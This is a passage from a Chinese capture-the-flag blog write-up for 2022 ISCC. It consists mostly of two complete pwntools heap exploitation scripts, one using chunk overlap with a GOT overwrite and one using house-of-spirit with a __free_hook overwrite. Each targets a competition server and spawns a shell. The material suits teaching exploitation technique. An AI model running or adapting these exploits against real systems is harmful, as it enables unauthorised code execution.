class="hljs-string">&quot;\x00&quot;</span>))<br>l32 = <span class="hljs-keyword">lambda</span>                :u32(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#bytes ==&gt;  int</span><br><span class="hljs-comment">#常用于调用了ROP输出类函数后，接受并转化为int类型</span><br><span class="hljs-comment">#                       uxx(   ru(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;)    )</span><br>leak= <span class="hljs-keyword">lambda</span> name,data      :sh.success(name + <span class="hljs-string">&quot;: 0x%x&quot;</span> % data)<br>s   = <span class="hljs-keyword">lambda</span> payload        :sh.send( payload)<br>sa  = <span class="hljs-keyword">lambda</span> a,b            :sh.sendafter(<span class="hljs-built_in">str</span>(a),<span class="hljs-built_in">str</span>(b))<br>sl  = <span class="hljs-keyword">lambda</span> payload        :sh.sendline(payload )<br>sla = <span class="hljs-keyword">lambda</span> a,b            :sh.sendlineafter(<span class="hljs-built_in">str</span> (a),<span class="hljs-built_in">str</span>(b))<br>ru  = <span class="hljs-keyword">lambda</span> a              :sh.recvuntil(<span class="hljs-built_in">str</span>(a))<br>r   = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>      :sh.recv(numb)<br><span class="hljs-comment"># https://www.yuque.com/squirre17/qqf7/wbeago #5b71964e</span><br>rl  = <span class="hljs-keyword">lambda</span>                :sh.recvline()<br>uu32= <span class="hljs-keyword">lambda</span> data           :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64= <span class="hljs-keyword">lambda</span> data           :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># https://blog.cc arol2358/article/details/106262701</span><br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :sh.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>. <span class="hljs-built_in">format</span>(addr))<br>check = <span class="hljs-keyword">lambda</span> data                 :<span class="hljs-string">&quot;data=&quot;</span>,data,<span class="hljs-string">&quot;|*|&quot;</span>,<span class="hljs-string">&quot;type=&gt;&quot;</span>,<span class="hljs-built_in">type</span>(data)<br><br><span class="hljs-comment"># 这里使用print会报错</span><br><span class="hljs-comment"># 交互时</span><br><span class="hljs-comment"># py2 &lt;==&gt; str = bytes</span><br><span class="hljs-comment">#addr=int(sh.recvuntil(&#x27;\n&#x27;,drop=True),base=16)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,data</span>):<br>    success(<span class="hljs-string">&quot;########-&gt;add&lt;-########&quot;</span>)<br>    sl(<span class="hljs-string">&quot;add&quot;</span>)                 <span class="hljs-comment"># fgets</span><br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index)) <br>    sla(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))   <span class="hljs-comment"># scanf</span><br>    sa(<span class="hljs-string">&quot;Data: &quot;</span>,data+<span class="hljs-string">&quot;\n&quot;</span>)        <span class="hljs-comment"># gets</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    success(<span class="hljs-string">&quot;########-&gt;delete&lt;-########&quot;</span>)<br>    sl(<span class="hljs-string">&quot;remove&quot;</span>)              <span class="hljs-comment"># fgets</span><br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index)) <span class="hljs-comment"># scanf</span><br><br>sys = <span class="hljs-number">0x400896</span><br><span class="hljs-comment">#sh = process(&quot;./unlink&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;123.57.69.203&quot;</span>,<span class="hljs-number">5810</span>)<br><span class="hljs-comment">#gdb.attach(sh,&quot;b *0x400A78&quot;)</span><br>                <span class="hljs-comment">#   malloc   # </span><br><span class="hljs-comment">#gdb.attach(sh,&quot;b *0x4009BD\n&quot;+&quot;b *0x400A8A\n&quot;+&quot;c\n&quot;*(24) ) </span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x410</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<span class="hljs-comment">#fake_chunk)#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x4f0</span>,<span class="hljs-string">&quot;cccc&quot;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&quot;/bin/sh\x00dddd&quot;</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&quot;/bin/sh\x00eeee&quot;</span>)<span class="hljs-comment">#4</span><br><br>delete(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#pause()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>   add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>-i,<span class="hljs-string">&quot;b&quot;</span>*(<span class="hljs-number">0xe8</span>-i))<br>   delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0xe0</span>+p64(<span class="hljs-number">0x510</span>))<span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#合并chunk2+chunk1+chunk0</span><br>success(<span class="hljs-string">&quot;合并chunk&quot;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>fgets_got  =  elf.got[<span class="hljs-string">&quot;fgets&quot;</span>]<span class="hljs-comment">#0x601050 </span><br>free_got  = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<span class="hljs-comment">#0x601018</span><br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>];system_got = elf.got[<span class="hljs-string">&quot;system&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>+<span class="hljs-number">0x410</span>+<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x410</span>*<span class="hljs-string">&quot;a&quot;</span>+p64(<span class="hljs-number">0x420</span>)+p64(<span class="hljs-number">0xf0</span>)+p64(free_got))<span class="hljs-comment">#chunk0 + chunk1</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-string">&quot;/bin/sh\x00ffff&quot;</span>)<br><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">3</span>*p64(system_plt+<span class="hljs-number">6</span>))<br><br><span class="hljs-comment">#add(6,0xe0,2*p64(0x400706)) #xxx</span><br><span class="hljs-comment">#add(6,0xe0,2*p64(sys))</span><br>raw_input()<br>sl(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#delete(5)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="h-o-s"><a href="#h-o-s" class="headerlink" title="h-o-s"></a>h-o-s</h2><p>在cmd布置fakechunk，free到unsortedbin泄露libc,再次将fakechunk释放到tcache，制造overlap，将freehook链入tcache，打freehook为system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&quot;/bin/tmux&quot;</span>,<span class="hljs-string">&quot;sp&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>io = remote(<span class="hljs-string">&#x27;123.57.69.203&#x27;</span>,<span class="hljs-number">5820</span> )<br><span class="hljs-comment"># io = remote(&#x27;127.0.0.1&#x27;,49161 )</span><br><span class="hljs-comment"># libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="hljs-comment"># io = process(&#x27;./hos&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./hos&#x27;</span>)<br><br>l64 = <span class="hljs-keyword">lambda</span>      :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32 = <span class="hljs-keyword">lambda</span>      :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>     : io.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>    : io.recvuntil(a,b)<br>rn = <span class="hljs-keyword">lambda</span> x           : io.recvn(x)<br>sn = <span class="hljs-keyword">lambda</span> x           : io.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x           : io.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> a,b         : io.sendafter(a,b)<br>sla = <span class="hljs-keyword">lambda</span> a,b        : io.sendlineafter(a,b)<br>irt = <span class="hljs-keyword">lambda</span>            : io.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-literal">None</span>  : gdb.attach(io, text)<br>lg = <span class="hljs-keyword">lambda</span> s           : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>uu32 = <span class="hljs-keyword">lambda</span> data      : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data      : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>ur64 = <span class="hljs-keyword">lambda</span> data      : u64(data.rjust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sl(<span class="hljs-string">&#x27;fill&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    sl(<span class="hljs-string">&#x27;get&#x27;</span>)<br><br><br>buf = <span class="hljs-number">0x6010a0</span><br>cmd = <span class="hljs-number">0x601160</span><br><br>add(<span class="hljs-number">0x41</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n =0</span><br><span class="hljs-comment"># add(0x31,&#x27;a&#x27;)#n=0</span><br>pay = <span class="hljs-string">&#x27;get&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x61</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) +p64(buf+<span class="hljs-number">0x70</span>)<br>sl(pay)<br>sl(<span class="hljs-string">&#x27;get&#x27;</span>)<span class="hljs-comment">#n=-1</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=0</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=1</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=2</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=3</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=4</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=5</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=6</span><br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=7</span><br>delete()<br>delete()<br>delete()<br>delete()<br>delete()<br>delete()<br>pay = <span class="hljs-string">&#x27;get&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) +p64(buf+<span class="hljs-number">0x10</span>)<br>sl(pay)<br>add(<span class="hljs-number">0x51</span>,p64(buf+<span class="hljs-number">0x10</span>) + p64(buf+<span class="hljs-number">0x70</span>) + p64(buf+<span class="hljs-number">0x10</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0x31</span>))<span class="hljs-comment">#n=1</span><br>delete()<span class="hljs-comment">#n=0</span><br>sl(<span class="hljs-string">&#x27;get&#x27;</span>)<span class="hljs-comment">#n=-1</span><br>add(<span class="hljs-number">0x51</span>,p64(buf+<span class="hljs-number">0x70</span>) + p64(buf+<span class="hljs-number">0x10</span>) + p64(buf+<span class="hljs-number">0x70</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0x31</span>))<span class="hljs-comment">#n=0</span><br>sl(<span class="hljs-string">&#x27;get&#x27;</span>)<span class="hljs-comment">#n=-1</span><br>libcbase = l64() -<span class="hljs-number">0x3ebca0</span><br>lg(<span class="hljs-string">&#x27;libcbase&#x27;</span>)<br>freehook = libcbase + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;freehook&#x27;</span>)<br>system = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;system&#x27;</span>)<br>add(<span class="hljs-number">0x81</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#n=0</span><br><br>pay = <span class="hljs-string">&#x27;get&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) +p64(buf+<span class="hljs-number">0x40</span>)<br>sl(pay)<span class="hljs-comment">#n = -1</span><br><br>pay = <span class="hljs-string">&#x27;fill&#x27;</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(freehook) + p64(<span class="hljs-number">0x81</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)+ p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) +p64(buf+<span class="hljs-number">0x40</span>)<br>sl(pay)<span class="hljs-comment">#n = 0</span><br><br>add(<span class="hljs-number">0x81</span>,p64(system))<br>add(<span class="hljs-number">0x41</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>delete()<br><span class="hljs-comment"># dbg()</span><br><br>irt()<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2022-ISCC(练武)</div>
      <div>http://example.com/2023/04/20/2022-ISCC(练武)/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>H0ne</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年4月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/04/20/2022-NCTF/" title="2022-NCTF">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2022-NCTF</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/04/20/2022-ISCC(%E6%93%82%E5%8F%B0)/" title="2022-ISCC(擂台)">
                        <span class="hidden-mobile">2022-ISCC(擂台)</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
